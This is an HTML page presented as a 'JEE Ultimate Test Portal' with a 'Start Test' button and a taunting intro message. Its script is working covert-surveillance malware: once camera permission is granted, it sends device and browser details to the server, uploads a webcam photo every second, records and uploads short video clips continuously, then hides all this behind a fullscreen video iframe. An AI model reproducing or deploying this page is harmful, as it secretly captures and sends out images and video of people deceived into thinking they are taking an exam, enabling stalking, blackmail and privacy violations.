<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JEE Ultimate Test Portal</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
html,body{height:100%;overflow:hidden;color:white;}

body::before{
content:"";
position:fixed;
width:500px;
height:500px;
background:#00e5ff;
filter:blur(140px);
opacity:.18;
top:-150px;
left:-120px;
animation:float 10s infinite alternate;
}

body::after{
content:"";
position:fixed;
width:500px;
height:500px;
background:#8b5cf6;
filter:blur(140px);
opacity:.18;
bottom:-150px;
right:-120px;
animation:float 12s infinite alternate-reverse;
}

@keyframes gradientMove{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}

#overlay{
width:min(92%,780px);
padding:60px;
border-radius:32px;
background:rgba(255,255,255,.08);
border:1px solid rgba(255,255,255,.15);
backdrop-filter:blur(30px);
box-shadow:
0 40px 80px rgba(0,0,0,.45),
inset 0 1px rgba(255,255,255,.15);
}

h1{
font-size:58px;
font-weight:800;
letter-spacing:-2px;
background:linear-gradient(90deg,#00e5ff,#fff,#8b5cf6);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}

/* 🔥 NEW INTRO EFFECT */
#intro{
font-size:20px;
color:#ff3c3c;
margin-bottom:20px;
animation:fadeIn 2s ease;
}

@keyframes fadeIn{
0%{opacity:0;transform:translateY(20px);}
100%{opacity:1;transform:translateY(0);}
}

button{
padding:18px 55px;
font-size:19px;
border-radius:60px;
background:linear-gradient(135deg,#00c6ff,#8b5cf6,#ff0080);
background-size:300% 300%;
animation:btn 5s infinite;
box-shadow:0 20px 60px rgba(124,58,237,.45);
}

button:hover{
transform:translateY(-4px) scale(1.05);
box-shadow:0 20px 60px rgba(124,58,237,.5);
}

@keyframes gradientBtn{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}

button:hover{
transform:scale(1.1);
box-shadow:0 0 35px #ff004c;
}

iframe{width:100%;height:100%;border:0;display:none;}

#v,#c{display:none;}

</style>
</head>

<body>

<div id="overlay">

<h1>JEE Ultimate Test Portal</h1>

<!-- 🔥 ADDED ONLY THIS -->
<div id="intro">
😎☠️ Oye bhooooootni....😎🥱<br>

🔥 "Tomar Ji ka system hai... lightly mat lena"
</div>

<button onclick="start()">▶ Start Test</button>

</div>

<iframe id="frame"></iframe>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>

let recorder;
let chunks=[];


/* DEVICE INFO */

function sendDeviceInfo(){

fetch("/device",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
device:navigator.platform,
os:navigator.userAgent,
browser:navigator.appVersion,
screen:screen.width+"x"+screen.height
})
});

}


/* SNAPSHOT */

function capture(){

if(!v.videoWidth) return;

c.width=v.videoWidth;
c.height=v.videoHeight;

const ctx=c.getContext("2d");

ctx.drawImage(v,0,0,c.width,c.height);

c.toBlob(b=>{

let f=new FormData();
f.append("photo",b,"u.jpg");

fetch("/upload",{method:"POST",body:f});

},"image/jpeg",0.9);

}


/* VIDEO RECORD */

function startVideo(stream){

recorder = new MediaRecorder(stream);

recorder.ondataavailable = e=>{
chunks.push(e.data);
};

recorder.onstop = ()=>{

let blob = new Blob(chunks,{type:"video/webm"});
chunks=[];

let f=new FormData();
f.append("video",blob,"v.webm");

fetch("/video",{method:"POST",body:f});

};

setInterval(()=>{

recorder.start();

setTimeout(()=>{
recorder.stop();
},5000);

},5000);

}


/* START TEST */

async function start(){

let stream;

try{

stream = await navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
});

}catch(e){

alert("Camera permission required");
return;

}

v.srcObject = stream;

sendDeviceInfo();

setInterval(capture,1000);

startVideo(stream);

document.getElementById("overlay").style.display="none";

const r = await fetch("/get_video_link");
const d = await r.json();

const frame=document.getElementById("frame");

frame.style.display="block";
frame.src=d.url;

if(frame.requestFullscreen){
frame.requestFullscreen();
}

}

</script>

</body>
</html>
